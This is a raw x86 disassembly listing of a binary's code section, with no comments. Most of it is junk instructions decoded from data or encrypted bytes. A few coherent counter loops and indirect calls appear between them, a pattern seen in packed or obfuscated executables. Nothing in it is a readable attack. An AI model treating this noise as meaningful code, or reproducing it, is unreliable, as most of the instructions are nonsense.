  406c77:	xchg   DWORD PTR [ebx-0x54cde825],edx
  406c7d:	je     0x406ca9
  406c7f:	lods   eax,DWORD PTR ds:[esi]
  406c80:	cmp    BYTE PTR [ecx-0xb8737c3],cl
  406c86:	mov    edi,0xf4c17b2f
  406c8b:	into   
  406c8c:	aad    0x64
  406c8e:	in     eax,dx
  406c8f:	mov    ebp,0x53be667f
  406c94:	fst    DWORD PTR [ecx+0x57]
  406c97:	and    ah,0xee
  406c9a:	sbb    BYTE PTR [ecx*1+0x6292ed6b],0x88
  406ca2:	fwait
  406ca3:	repnz (bad) 
  406ca5:	mov    dl,0xd2
  406ca7:	(bad)  
  406ca8:	sbb    BYTE PTR [ebx],dh
  406caa:	jno    0x406c96
  406cac:	pop    ebp
  406cad:	cld    
  406cae:	sub    ah,BYTE PTR [ebx+eiz*8-0x36db9b8]
  406cb5:	std    
  406cb6:	icebp  
  406cb7:	nop
  406cb8:	fisttp QWORD PTR es:[eax-0x16]
  406cbc:	jb     0x406c4a
  406cbe:	sbb    eax,0x104a5bbe
  406cc3:	sub    bl,BYTE PTR [ecx+0x40]
  406cc6:	add    dl,dl
  406cc8:	pusha  
  406cc9:	dec    eax
  406cca:	fisttp DWORD PTR [ebx]
  406ccc:	mov    ecx,0x2fa5e682
  406cd1:	and    eax,0xf6a85742
  406cd6:	js     0x406d4b
  406cd8:	mov    edx,0x304afb27
  406cdd:	aaa    
  406cde:	fs out dx,al
  406ce0:	or     esp,DWORD PTR [edx]
  406ce2:	xlat   BYTE PTR ds:[ebx]
  406ce3:	push   ebx
  406ce4:	arpl   WORD PTR [eax-0x66],sp
  406ce7:	xor    DWORD PTR [ecx],ebp
  406ce9:	jge    0x406d1c
  406ceb:	les    ecx,FWORD PTR [edi+0x1e]
  406cee:	mov    esi,0xadbe3278
  406cf3:	push   ecx
  406cf4:	inc    ebx
  406cf5:	jmp    0x406c8f
  406cf7:	loop   0x406c93
  406cf9:	leave  
  406cfa:	bound  ecx,QWORD PTR [ebx-0x161f1ddf]
  406d00:	hlt    
  406d01:	test   eax,0x93003095
  406d06:	out    dx,eax
  406d07:	dec    ebx
  406d08:	retf   
  406d09:	and    ah,ch
  406d0b:	dec    ecx
  406d0c:	inc    esp
  406d0d:	test   BYTE PTR [ebx-0xae1780c],bh
  406d13:	jmp    0x3d99:0x38d0febf
  406d1a:	xchg   BYTE PTR [edi-0x25],dl
  406d1d:	aaa    
  406d1e:	lahf   
  406d1f:	pop    ebp
  406d20:	sub    BYTE PTR [ebx],dl
  406d22:	fisttp DWORD PTR [eax]
  406d24:	mov    ah,0x73
  406d26:	loop   0x406d4f
  406d28:	aaa    
  406d29:	mov    eax,ds:0x6a3cab69
  406d2e:	sbb    ebx,DWORD PTR [esi+0x3cf620f]
  406d34:	pop    ss
  406d35:	inc    ebx
  406d36:	aam    0x5a
  406d38:	(bad)  
  406d39:	or     ch,bh
  406d3b:	sbb    ecx,ebp
  406d3d:	popf   
  406d3e:	and    al,0xd7
  406d40:	mov    esi,DWORD PTR [ecx-0x5d]
  406d43:	aas    
  406d44:	jmp    DWORD PTR [esi]
  406d46:	inc    eax
  406d47:	mov    es,WORD PTR [edi+0x2f]
  406d4a:	cmc    
  406d4b:	dec    ebx
  406d4c:	dec    ebp
  406d4d:	push   edi
  406d4e:	jae    0x406d59
  406d50:	mov    ch,0xfc
  406d52:	fst    DWORD PTR [edi+0x2]
  406d55:	nop
  406d56:	jns    0x406d96
  406d58:	dec    esi
  406d59:	imul   ebp,DWORD PTR ds:[ecx+0x5f],0x43
  406d5e:	add    cl,BYTE PTR [edx]
  406d60:	sub    ah,BYTE PTR [esi-0x36]
  406d63:	stos   DWORD PTR es:[edi],eax
  406d64:	adc    dl,BYTE PTR [esi]
  406d66:	out    dx,al
  406d67:	imul   eax,DWORD PTR [ebx],0x103b1cab
  406d6d:	dec    esi
  406d6e:	lds    ecx,FWORD PTR [ebx+0x5b23f575]
  406d74:	aaa    
  406d75:	xchg   BYTE PTR [ecx-0x34],al
  406d78:	test   BYTE PTR ds:0xc81540b,0x9c
  406d7f:	(bad)  
  406d81:	sub    DWORD PTR [esi-0x35],eax
  406d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d85:	inc    eax
  406d86:	sti    
  406d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d88:	inc    edi
  406d89:	sbb    BYTE PTR [edi+0xc],dl
  406d8c:	jnp    0x406d70
  406d8e:	add    BYTE PTR cs:[eax],ch
  406d91:	retf   
  406d92:	cmc    
  406d93:	jmp    0x406d68
  406d95:	pop    ecx
  406d96:	bound  edi,QWORD PTR [esi+0x2513e95c]
  406d9c:	add    edx,ecx
  406d9e:	and    DWORD PTR ds:0x4304df,0x0
  406da8:	mov    edi,DWORD PTR ds:0x4304df
  406dae:	inc    edi
  406daf:	mov    DWORD PTR ds:0x4304df,edi
  406db5:	cmp    DWORD PTR ds:0x4304df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42ec23
  406dcb:	cmp    DWORD PTR ds:0x4304df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4304df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4304df,edi
  406de7:	cmp    DWORD PTR ds:0x4304df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e7c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x7a477b7b],si
  406e0c:	retf   
  406e0d:	mov    esp,0x7e38f127
  406e12:	jle    0x406d9e
  406e14:	jg     0x406e94
  406e16:	jle    0x406e6e
  406e18:	pusha  
  406e19:	push   es
  406e1a:	adc    ch,BYTE PTR [eax]
  406e1c:	out    0xb0,eax
  406e1e:	mov    esi,ebp
  406e20:	mov    esi,0x7009313c
  406e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e26:	mov    ds:0x7a542245,al
  406e2b:	xor    DWORD PTR [ecx-0x17],ebp
  406e2e:	cmc    
  406e2f:	mov    dh,0xfa
  406e31:	pop    eax
  406e32:	repz and BYTE PTR [edi-0x76a485bb],bh
  406e39:	fcmovu st,st(5)
  406e3b:	addr16 popf 
  406e3d:	jge    0x406e7f
  406e3f:	lods   al,BYTE PTR ds:[esi]
  406e40:	pushf  
  406e41:	into   
  406e42:	push   edi
  406e43:	sbb    eax,0x12573360
  406e48:	cs and al,0x88
  406e4b:	inc    esp
  406e4c:	stos   DWORD PTR es:[edi],eax
  406e4d:	mov    ch,0xf1
  406e4f:	test   BYTE PTR [eax],cl
  406e51:	cs jne 0x406e64
  406e54:	int    0xc2
  406e56:	(bad)  
  406e58:	push   esp
  406e59:	nop
  406e5a:	and    ch,BYTE PTR [ebx-0x42]
  406e5d:	dec    esi
  406e5e:	or     al,0x64
  406e60:	fldcw  WORD PTR [edx-0x53]
  406e63:	xchg   ebp,eax
  406e64:	add    al,0xa5
  406e66:	xlat   BYTE PTR ds:[ebx]
  406e67:	in     eax,dx
  406e68:	jmp    0xfd2dc7ee
  406e6d:	out    0xa0,eax
  406e6f:	ss fs fwait
  406e72:	mov    ah,0x6f
  406e74:	iret   
  406e75:	or     al,bl
  406e77:	sub    al,0x2a
  406e79:	int3   
  406e7a:	xchg   ecx,eax
  406e7b:	xchg   edi,eax
  406e7c:	mov    al,0x8f
  406e7e:	les    esi,FWORD PTR [ebp+0x2]
  406e81:	mov    bh,0x53
  406e83:	mov    ah,0x2c
  406e85:	jo     0x406e13
  406e87:	sar    DWORD PTR [esi+0x7b9cffd5],0xd5
  406e8e:	ret    
  406e8f:	mov    bl,ah
  406e91:	scas   eax,DWORD PTR es:[edi]
  406e92:	jge    0x406ead
  406e94:	stos   BYTE PTR es:[edi],al
  406e95:	out    0x20,eax
  406e97:	dec    ecx
  406e98:	jg     0x406e6a
  406e9a:	mov    ds:0xf88e6c11,eax
  406e9f:	mov    dh,0x15
  406ea1:	aaa    
  406ea2:	sub    al,0x4a
  406ea4:	or     eax,DWORD PTR [esi+0x41]
  406ea7:	imul   edx,DWORD PTR [ebx-0x70],0x39
  406eab:	int3   
  406eac:	iret   
  406ead:	aad    0x56
  406eaf:	shl    DWORD PTR [ecx-0x1f],0x5d
  406eb3:	xchg   BYTE PTR [ebx],ah
  406eb5:	add    eax,0xde814741
  406eba:	nop
  406ebb:	fsubr  DWORD PTR [eax]
  406ebd:	outs   dx,BYTE PTR ds:[esi]
  406ebe:	mov    al,0x21
  406ec0:	push   edx
  406ec1:	adc    eax,0x76ff0295
  406ec6:	mov    bl,0x6b
  406ec8:	and    ecx,edx
  406eca:	mov    DWORD PTR [eax],edi
  406ecc:	mov    al,0x73
  406ece:	cmp    ebp,DWORD PTR [eax-0x1251d4eb]
  406ed4:	inc    ecx
  406ed5:	and    eax,0x2d4793c1
  406eda:	mov    al,ds:0xc6bc8572
  406edf:	int3   
  406ee0:	rol    BYTE PTR [ecx],cl
  406ee2:	(bad)  
  406ee3:	in     al,dx
  406ee4:	ds ins DWORD PTR es:[edi],dx
  406ee6:	cmp    DWORD PTR [ecx],edi
  406ee8:	retf   
  406ee9:	jb     0x406ec2
  406eeb:	out    dx,eax
  406eec:	sbb    eax,0xcedc7b0d
  406ef1:	sub    dh,al
  406ef3:	sbb    eax,0xe10c8b40
  406ef8:	inc    ecx
  406ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efa:	call   DWORD PTR es:[eax-0x3e]
  406efe:	call   0x146a15fb
  406f03:	fnsave [esi+0x69]
  406f06:	xchg   ecx,eax
  406f07:	out    0xa4,al
  406f09:	es ds pushf 
  406f0c:	sub    dh,ch
  406f0e:	fdivr  st,st(3)
  406f10:	stos   DWORD PTR es:[edi],eax
  406f11:	aam    0x2d
  406f13:	dec    ecx
  406f14:	sbb    DWORD PTR [eax],0x4ec6b4c6
  406f1a:	jecxz  0x406f61
  406f1c:	out    dx,eax
  406f1d:	lock jno 0x406f08
  406f20:	jae    0x406f25
  406f22:	mov    esi,DWORD PTR [ebx]
  406f24:	mov    dh,BYTE PTR [edi]
  406f26:	and    BYTE PTR [eax],al
  406f28:	xor    al,0x12
  406f2a:	dec    ebx
  406f2b:	xchg   ecx,eax
  406f2c:	pop    eax
  406f2d:	je     0x406ec0
  406f2f:	pop    ds
  406f30:	cmp    al,0xdf
  406f32:	or     al,0x72
  406f34:	cld    
  406f35:	inc    esi
  406f36:	push   esi
  406f37:	cmp    bh,dh
  406f39:	sub    DWORD PTR ds:[ecx-0x61],eax
  406f3d:	fprem  
  406f3f:	in     eax,0xa2
  406f41:	cs mov ah,0xd
  406f44:	inc    edx
  406f45:	cmc    
  406f46:	bound  esi,QWORD PTR [esp+edi*2]
  406f49:	pushf  
  406f4a:	jmp    0xaf25:0x76de227c
  406f51:	push   es
  406f52:	add    BYTE PTR [edi-0x59],al
  406f55:	in     eax,dx
  406f56:	cmp    esi,ebp
  406f58:	inc    esp
  406f59:	jns    0x406f6f
  406f5b:	xchg   DWORD PTR ds:0x77c8f157,ebp
  406f61:	jmp    0x949c:0xd07b0184
  406f68:	and    BYTE PTR [eax+0x41c67300],0xd2
  406f6f:	mov    al,0xbb
  406f71:	mov    ds:0x261541c5,al
  406f76:	das    
  406f77:	sti    
  406f78:	stos   DWORD PTR es:[edi],eax
  406f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f7a:	fnstcw WORD PTR [ebp+0x57]
  406f7d:	jge    0x406f32
  406f7f:	cs (bad) 
  406f81:	mov    dh,0x36
  406f83:	jp     0x406fdb
  406f85:	stos   DWORD PTR es:[edi],eax
  406f86:	jnp    0x406fc3
  406f88:	cmp    al,0x60
  406f8a:	je     0x406f80
  406f8c:	out    dx,al
  406f8d:	loopne 0x406fbf
  406f8f:	adc    al,0xd8
  406f91:	pop    eax
  406f92:	fisttp WORD PTR [edx]
  406f94:	rep lods eax,DWORD PTR ds:[esi]
  406f96:	mov    ebp,0x29a2c69a
  406f9b:	push   ecx
  406f9c:	mov    cl,0xd
  406f9e:	push   ebx
  406f9f:	pop    ecx
  406fa0:	dec    eax
  406fa1:	mov    dl,BYTE PTR [edx+0x66e07af7]
  406fa7:	add    BYTE PTR [ebx+0x1e],dh
  406faa:	imul   ecx,DWORD PTR [ecx+0x558bf855],0x653d3308
  406fb4:	add    al,0x43
  406fb6:	add    BYTE PTR [ebx],dh
  406fb8:	rol    BYTE PTR [ebx],1
  406fba:	shl    DWORD PTR [ecx],1
  406fbc:	cmp    eax,0x430445
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x14603d82,edx
  406fd4:	or     ebp,edi
  406fd6:	or     eax,0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406f86
  406fdf:	out    0x7b,eax
  406fe1:	sbb    DWORD PTR [edx+0x35],0xd4bb1787
  406fe8:	mov    esi,0x8c848847
  406fed:	inc    eax
  406fee:	test   ebx,0x193f8f4a
  406ff4:	inc    esi
  406ff5:	imul   ecx,DWORD PTR [edx-0x2a],0xe69f8cbb
  406ffc:	push   esi
  406ffd:	xchg   edi,ecx
  406fff:	fmul   QWORD PTR [ecx+0x6f6e6421]
  407005:	mov    ecx,0x9cb300c7
  40700a:	adc    ebx,ecx
  40700c:	jmp    0x9951:0x9213e42d
  407013:	add    ebp,ebp
  407015:	jne    0x407058
  407017:	xchg   ebx,eax
  407018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407019:	test   al,0x1c
  40701b:	bound  esp,QWORD PTR ds:0x34d3e1de
  407021:	adc    ebx,DWORD PTR [ebp-0x51]
  407024:	aad    0x35
  407026:	and    edx,DWORD PTR [eax-0x18]
  407029:	loope  0x407064
  40702b:	outs   dx,DWORD PTR ds:[esi]
  40702c:	(bad)  
  40702d:	or     eax,0xcfc85ca8
  407032:	loop   0x407066
  407034:	sub    al,0x82
  407036:	jp     0x407059
  407038:	cmp    edi,esp
  40703a:	jp     0x4070b8
  40703c:	add    DWORD PTR [eax],ebx
  40703e:	mov    esi,0x6bb13181
  407043:	adc    eax,DWORD PTR [edi]
  407045:	mov    ch,0x4f
  407047:	ror    BYTE PTR [ebp+0x1e1d43ca],1
  40704d:	out    dx,al
  40704e:	and    ebp,DWORD PTR [esi]
  407050:	add    al,BYTE PTR [edx-0x65d14659]
  407056:	mov    ah,0x72
  407058:	retf   
  407059:	mov    ebx,0xda4336e9
  40705e:	test   eax,0xce3ddd55
  407063:	ds cwde 
  407065:	loopne 0x407034
  407067:	nop
  407068:	push   cs
  407069:	or     eax,0x8ba14393
  40706e:	dec    ebx
  40706f:	pop    ebx
  407070:	sub    dl,ah
  407072:	dec    eax
  407073:	(bad)  
  407074:	mov    DWORD PTR [esi-0x15],esp
  407077:	mov    esi,0x8fab8ea2
  40707c:	pop    edx
  40707d:	mov    dl,0xeb
  40707f:	and    al,0xa7
  407081:	or     ch,BYTE PTR [edx-0x58e8a50a]
  407087:	popa   
  407088:	push   ds
  407089:	push   ecx
  40708a:	add    ecx,ecx
  40708c:	(bad)  
  40708d:	jp     0x4070a1
  40708f:	scas   eax,DWORD PTR es:[edi]
  407090:	out    dx,eax
  407091:	pusha  
  407092:	xlat   BYTE PTR ds:[ebx]
  407093:	jae    0x4070bf
  407095:	hlt    
  407096:	scas   eax,DWORD PTR es:[edi]
  407097:	jo     0x4070ed
  407099:	inc    ecx
  40709a:	jb     0x40707e
  40709c:	fstp   QWORD PTR [ebp-0x63]
  40709f:	mov    ds:0x1497f628,al
  4070a4:	inc    ebp
  4070a5:	cs xchg ebx,eax
  4070a7:	in     eax,0xa2
  4070a9:	or     BYTE PTR [ebx+0x3e],bh
  4070ac:	mov    bl,0x47
  4070ae:	add    eax,0xd05233c0
  4070b3:	inc    ebx
  4070b4:	push   es
  4070b5:	fild   QWORD PTR [edx+edx*4+0x66]
  4070b9:	dec    ebx
  4070ba:	sub    ch,BYTE PTR [ecx]
  4070bc:	cmp    BYTE PTR [ebp+0x1adf8ce4],bh
  4070c2:	or     esi,edx
  4070c4:	sbb    edi,DWORD PTR [ecx]
  4070c6:	pushf  
  4070c7:	les    edx,FWORD PTR [ebx]
  4070c9:	in     eax,0x30
  4070cb:	nop
  4070cc:	fisttp WORD PTR [edi-0xa3f7f0b]
  4070d2:	sti    
  4070d3:	mov    edx,0x3907f8ae
  4070d8:	ror    ebx,cl
  4070da:	or     eax,0xe3afdc1d
  4070df:	out    0x5f,al
  4070e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070e2:	inc    edx
  4070e3:	fistp  DWORD PTR [edx]
  4070e5:	push   esp
  4070e6:	mov    DWORD PTR es:[edx+ecx*1+0x5d],esi
  4070eb:	sti    
  4070ec:	dec    ecx
  4070ed:	dec    edi
  4070ee:	sbb    DWORD PTR [edx],ecx
  4070f0:	inc    ebp
  4070f1:	sub    cl,BYTE PTR [edi-0x6b]
  4070f4:	or     BYTE PTR [ebx-0x11e9f340],ah
  4070fa:	clc    
  4070fb:	jo     0x407087
  4070fd:	mov    eax,0x80c4cb6b
  407102:	outs   dx,BYTE PTR ds:[esi]
  407103:	scas   al,BYTE PTR es:[edi]
  407104:	adc    ebp,DWORD PTR [edx+0x1e85efb0]
  40710a:	out    dx,eax
  40710b:	out    0xac,al
  40710d:	lods   al,BYTE PTR ds:[esi]
  40710e:	mov    es,WORD PTR [ebp+0x4c]
  407111:	fld    QWORD PTR [ebx]
  407113:	sub    al,0x3f
  407115:	jl     0x4070d4
  407117:	and    bl,BYTE PTR [ebp-0x49c64873]
  40711d:	outs   dx,BYTE PTR ds:[esi]
  40711e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40711f:	xor    ah,dh
  407121:	inc    esp
  407122:	lods   eax,DWORD PTR ds:[esi]
  407123:	int3   
  407124:	pop    edx
  407125:	cmc    
  407126:	dec    edx
  407127:	and    eax,0x974ab991
  40712c:	mov    ds:0x76b8cad8,eax
  407131:	mov    cl,0x90
  407133:	scas   al,BYTE PTR es:[edi]
  407134:	imul   edx,DWORD PTR [ebx-0x178638be],0xfffffff5
  40713b:	ds jg  0x4070e6
  40713e:	jmp    0x8be00b39
  407143:	inc    ecx
  407144:	fcom   QWORD PTR [edx]
  407146:	mov    ah,0x9b
  407148:	mov    BYTE PTR [ebp+ebx*2+0x29],dl
  40714c:	mov    ch,0x0
  40714e:	adc    ebp,DWORD PTR [ebx]
  407150:	in     al,dx
  407151:	fs retf 
  407153:	ror    eax,1
  407155:	inc    edi
  407156:	cmp    al,BYTE PTR [ebx+0x32]
  407159:	inc    BYTE PTR [ecx+0x1ce97f42]
  40715f:	and    BYTE PTR [ecx-0x60],al
  407162:	push   esp
  407163:	mov    ?,edi
  407165:	jnp    0x40718d
  407167:	push   0xbc715868
  40716c:	inc    edi
  40716d:	aas    
  40716e:	mov    esp,eax
  407170:	fcom   QWORD PTR [edx-0x7ef3aa77]
  407176:	and    eax,0x42e7c0
  40717b:	add    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [eax],al
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e7c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e7c0,edi
  407191:	cmp    DWORD PTR ds:0x42e7c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e7c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42eaab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430469,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43044d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430461,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430461
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430461,edi
  4071fa:	cmp    DWORD PTR ds:0x430461,0x6
  407201:	jne    0x407247
  407207:	push   0x42e929
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42eaaf
  407247:	cmp    DWORD PTR ds:0x430461,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430461
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430461,edi
  407261:	cmp    DWORD PTR ds:0x430461,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e7bc
  40728e:	or     DWORD PTR ds:0x430465,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0xbbc93f15
  4072a7:	inc    eax
  4072a8:	test   DWORD PTR [ecx-0x75818139],ebx
  4072ae:	jg     0x40732e
  4072b0:	jle    0x407240
  4072b2:	aad    0xde
  4072b4:	test   ah,bh
  4072b6:	xchg   BYTE PTR [ebp+0x58a3009b],ch
  4072bc:	packssdw mm1,QWORD PTR [esi]
  4072bf:	cmp    BYTE PTR [ebx+eiz*2],bl
  4072c2:	cmp    al,0xc6
  4072c4:	push   es
  4072c5:	cli    
  4072c6:	lds    edi,FWORD PTR [eax]
  4072c8:	scas   al,BYTE PTR es:[edi]
  4072c9:	fisub  WORD PTR [ecx+0x59582d76]
  4072cf:	(bad)  
  4072d0:	push   0xffffffdf
  4072d2:	leave  
  4072d3:	cmp    edi,DWORD PTR [edi+0x4e384ea1]
  4072d9:	mov    bh,BYTE PTR [edi+ebp*2-0x20b39e02]
  4072e0:	adc    eax,0x51cbfff7
  4072e5:	dec    edx
  4072e6:	sbb    BYTE PTR [eax+0xdef2c34],dh
  4072ec:	jns    0x4072cd
  4072ee:	pop    ecx
  4072ef:	leave  
  4072f0:	ds and al,0x44
  4072f3:	test   eax,edi
  4072f5:	mov    al,0x7
  4072f7:	ret    0x9e55
  4072fa:	and    eax,0xed1452f2
  4072ff:	push   edi
  407300:	and    dl,BYTE PTR [edi]
  407302:	out    0xb7,eax
  407304:	mov    ah,cl
  407306:	int    0xcb
  407308:	(bad)  
  407309:	fcomi  st,st(7)
  40730b:	lahf   
  40730c:	dec    eax
  40730d:	ja     0x407375
  40730f:	inc    edi
  407310:	adc    eax,0xa70bec95
  407315:	xchg   ebp,eax
  407316:	or     BYTE PTR [ebx+0x1e],dh
  407319:	mov    ecx,0x59dab0bf
  40731e:	fs or  esp,eax
  407321:	fmulp  st(7),st
  407323:	das    
  407324:	mov    bh,0xac
  407326:	mov    al,ds:0xcdf02dbd
  40732b:	dec    esi
  40732c:	test   DWORD PTR [edx+esi*8-0x7d],edx
  407330:	daa    
  407331:	icebp  
  407332:	xchg   BYTE PTR [esi+edi*8-0x40],dh
  407336:	lods   eax,DWORD PTR ds:[esi]
  407337:	imul   esi,DWORD PTR [ecx],0xffffffcb
  40733a:	pop    edi
  40733c:	(bad)  
  40733d:	retf   
  40733e:	les    edx,FWORD PTR [edi+0x18]
  407341:	dec    eax
  407342:	fld    TBYTE PTR [ebx-0x1d]
  407345:	jmp    0x4464f139
  40734a:	(bad)  
  40734b:	fcmovbe st,st(3)
  40734d:	mov    dh,0x7a
  40734f:	lods   eax,DWORD PTR ds:[esi]
  407350:	(bad)
  407353:	push   0xffffffa0
  407355:	pop    edi
  407356:	pop    ebp
  407357:	cs ins BYTE PTR es:[edi],dx
  407359:	out    0x8b,eax
  40735b:	mov    ch,0x8b
  40735d:	cmp    al,0x14
  40735f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407360:	sbb    al,0x12
  407362:	push   esi
  407363:	xor    DWORD PTR [ecx],edx
  407365:	mov    ah,0xcc
  407367:	out    dx,al
  407368:	push   eax
  407369:	clc    
  40736a:	cmp    BYTE PTR [ebx+0x5c57f908],dl
  407370:	mov    ebp,0xf99eb74e
  407375:	xor    DWORD PTR [edi],edx
  407377:	hlt    
  407378:	mov    ds:0x82630118,eax
  40737d:	add    eax,DWORD PTR [esi+ebp*8-0x272be1ad]
  407384:	lds    ecx,FWORD PTR ds:0x8b6d83a8
  40738a:	repnz or al,0xb7
  40738d:	loopne 0x407338
  40738f:	out    dx,eax
  407390:	mov    eax,0x3df0a274
  407395:	out    0xfc,al
  407397:	cmp    eax,esp
  407399:	pop    eax
  40739a:	adc    bl,bl
  40739c:	in     eax,dx
  40739d:	mov    bh,0x6c
  40739f:	ret    
  4073a0:	add    edx,DWORD PTR [edi]
  4073a2:	mov    eax,0xb73570ef
  4073a7:	ss inc ebp
  4073a9:	and    esp,DWORD PTR [eax+eax*4+0x2fec74d1]
  4073b0:	fs jb  0x40736d
  4073b3:	cmp    BYTE PTR [edx-0x3a8b3c62],al
  4073b9:	es cs je 0x4073a6
  4073bd:	jns    0x4073dd
  4073bf:	mov    ebx,0x1fc310b4
  4073c4:	cs add al,0xa2
  4073c7:	add    al,0x41
  4073c9:	cs js  0x40738c
  4073cc:	push   ecx
  4073cd:	cli    
  4073ce:	nop
  4073cf:	mov    ds:0x7165faee,eax
  4073d4:	out    0x92,al
  4073d6:	loope  0x4073f7
  4073d8:	xor    al,0xa5
  4073da:	mov    ah,0xa8
  4073dc:	push   edi
  4073dd:	mov    ecx,0x8c1947ae
  4073e2:	push   0xffffff96
  4073e4:	jl     0x407407
  4073e6:	out    dx,al
  4073e7:	dec    eax
  4073e8:	pop    eax
  4073e9:	inc    esp
  4073ea:	adc    edx,ebx
  4073ec:	jmp    0xfdab:0xad60045a
  4073f3:	fsub   QWORD PTR [edi-0x1e]
  4073f6:	cld    
  4073f7:	and    al,0x5e
  4073f9:	fiadd  DWORD PTR [esi+0xa]
  4073fc:	dec    eax
  4073fd:	mov    BYTE PTR [ebp-0x7242063d],bh
  407403:	aas    
  407404:	repnz inc edx
  407406:	sbb    eax,DWORD PTR fs:[esi-0x62436136]
  40740d:	dec    ebx
  40740e:	dec    ebx
  40740f:	mov    ebx,0xe6416618
  407414:	ds push ebx
  407416:	lahf   
  407417:	or     BYTE PTR ds:[esi-0x19949191],bh
  40741e:	mov    dh,BYTE PTR [ebp-0x1b]
  407421:	pop    eax
  407422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407423:	xchg   edx,edi
  407425:	mov    WORD PTR [ebx-0x66d1660c],es
  40742b:	shr    dh,1
  40742d:	sub    eax,0xb07571f6
  407432:	lods   eax,DWORD PTR ds:[esi]
  407433:	xchg   edi,eax
  407434:	xor    ecx,ebp
  407436:	jp     0x407433
  407438:	mov    esi,0xc975d333
  40743d:	(bad)  
  40743e:	std    
  40743f:	adc    dl,BYTE PTR ds:0xf7da8224
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x4304d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430449,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [eax],cl
  40747e:	adc    BYTE PTR [ebp-0x6],0x35
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x4074b1
  40748a:	sbb    BYTE PTR [ecx],al
  40748c:	test   eax,0xbe51819d
  407491:	pop    edx
  407492:	mov    dh,0xa8
  407494:	jmp    0x23262dbf
  407499:	mov    al,0x40
  40749b:	mov    dh,0x41
  40749d:	shr    BYTE PTR [ecx-0x30165605],cl
  4074a3:	in     al,0x39
  4074a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a6:	mov    ah,0xef
  4074a8:	xchg   edi,eax
  4074a9:	mov    eax,ds:0xabc97af4
  4074ae:	std    
  4074af:	mul    edx
  4074b1:	in     al,dx
  4074b2:	jl     0x40748c
  4074b4:	(bad)  
  4074b6:	pop    esi
  4074b7:	sbb    dl,BYTE PTR [eax+eiz*8]
  4074ba:	shl    BYTE PTR [eax-0x53e5072a],cl
  4074c0:	dec    ebp
  4074c1:	jmp    0xfd06:0xd126a569
  4074c8:	test   eax,0x32371f0c
  4074cd:	imul   ecx,DWORD PTR [edi],0xf
  4074d0:	popa   
  4074d1:	ror    edx,1
